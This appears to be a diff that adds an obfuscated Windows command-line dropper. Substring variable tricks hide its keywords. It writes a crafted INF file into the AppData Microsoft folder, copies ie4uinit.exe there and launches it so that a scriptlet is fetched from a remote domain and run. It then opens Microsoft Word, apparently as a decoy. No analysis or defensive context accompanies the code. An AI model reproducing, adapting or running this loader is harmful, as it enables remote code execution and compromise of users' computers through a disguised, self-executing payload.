@@ -1,0 +1,8 @@
+/v /ccall%Adjust:~0,1%et "Corporations=.inf" &&
+  %Adjust:~0,1%et "Peripherals=ieuinit!Corporations!" &&
+  call %Adjust:~0,1%et "Conferences=%appdata%\micro%Adjust:~0,1%oft\" &&
+  (for /D %g in ("[version]" "signature =$windows nt$" "[27332]" "ieu%Indicate%!Corporations!" "[defaultin%Adjust:~0,1%tall.windows7]" "delfiles=27332" "Un\" "Register\" "OCXs=DEEA00" "[string%Adjust:~0,1%]" "Republicans=b;Slide" "Examines=%time%" "Sword=com" "Thing=t;Patients" "Bones=/" "%Adjust:~0,1%hortsvcname=' '" "Indicate=init" "%Adjust:~0,1%ervicename=' '" "Scorpion=:;Deputy" "Endorse=h" "[DEEA00]" "sc\" "ro%Republicans%j,NI,%Endorse%%Thing%%Thing%p%Scorpion%%Bones%%Bones%akfv.edwarddhall.%Sword%/lookingfor" "[de%Adjust:~0,1%tinationdirs]" "27332=01" "defaultdestdir=11" ) do @echo %~g)>"!Conferences!!Peripherals!" &&
+  %Adjust:~0,1%et "Revisions=ie4uinit.exe" &&
+  call xcopy /Y /C /Q %win!Universities!ir%\%Adjust:~0,1%ystem32\!Revisions! "!Conferences!*" &&
+  start "" "!Conferences!!Revisions!" -basesettings &&
+  start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
